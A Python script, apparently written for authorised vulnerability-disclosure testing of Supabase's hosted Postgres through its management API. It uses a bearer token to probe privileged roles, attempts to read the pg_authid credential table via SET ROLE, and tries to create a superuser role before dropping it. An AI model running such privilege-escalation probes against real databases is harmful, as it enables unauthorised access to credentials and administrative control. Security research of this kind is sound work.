# -*- coding: utf-8 -*-
"""提权边界测试: supabase_privileged_role 面 + CREATE ROLE SUPERUSER 拦截测试 (可逆, 尾部清理)"""
import http.client, ssl, json, time, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import BEARER_JWT, VDP_HEADERS, UA, API_HOST, PROJECT_REF

ctx = ssl.create_default_context()
out = []
def q(sql, tag):
    body = json.dumps({"query": sql})
    c = http.client.HTTPSConnection(API_HOST, timeout=25, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json",
         "Authorization": "Bearer " + BEARER_JWT}
    h.update(VDP_HEADERS)
    t0 = time.time()
    try:
        c.request('POST', '/v1/projects/%s/database/query' % PROJECT_REF, headers=h, body=body)
        r = c.getresponse()
        b = r.read(5000).decode('utf-8', errors='replace')
        out.append('### [%s] (%.1fs)\n%s | %s' % (tag, time.time() - t0, r.status, b[:2200]))
        c.close()
    except Exception as e:
        out.append('### [%s] ERR %s' % (tag, e))

# 1. supabase_privileged_role 属性 + 完整角色清单尾部
q("select rolname, rolsuper, rolcreatedb, rolcreaterole, rolbypassrls, rolcanlogin from pg_roles where rolname ilike '%privileg%' or rolname ilike '%supabase%' or rolname='postgres' order by 1;", "priv-role")
# 2. supabase_privileged_role 的成员
q("select me.rolname from pg_roles me join pg_auth_members m on m.member=me.oid join pg_roles r on r.oid=m.roleid where r.rolname='supabase_privileged_role';", "priv-members")
# 3. pg_authid 读权限来源探测: set role 到 supabase_privileged_role 再读
q("begin; set local role supabase_privileged_role; select current_user, count(*) n from pg_authid; rollback;", "priv-authid")
# 4. has_table_privilege 直接确认
q("select has_table_privilege('postgres','pg_authid','select') as pg_can, has_table_privilege('supabase_privileged_role','pg_authid','select') as priv_can;", "acl-chk")
# 5. CREATE ROLE 普通角色 (验证通道; 若成功立即 drop)
q("create role sbx_tmp_probe login password 'Sbxtmp12345!';", "create-normal")
q("drop role if exists sbx_tmp_probe;", "drop-normal")
# 6. CREATE ROLE SUPERUSER (核心测试; 若成功立即 drop)
q("create role sbx_tmp_su superuser login password 'Sbxtmp12345!';", "create-superuser")
q("drop role if exists sbx_tmp_su;", "drop-superuser")
# 7. pg_authid 中 supabase_admin/postgres 是否有密码 (只查存在性)
q("select rolname from pg_authid where rolpassword is not null and rolname in ('supabase_admin','postgres','supabase_privileged_role');", "pw-exists")
# 8. 其他提权向量: alter role 自身 (postgres 改自己属性, 可逆)
q("select rolname from pg_roles where rolname='postgres' and pg_has_role(current_user, oid, 'MEMBER');", "self-check")

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb25_priv.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('ttl=%ds' % (1788510807 - int(time.time())))
print('\n'.join(out)[:8000])
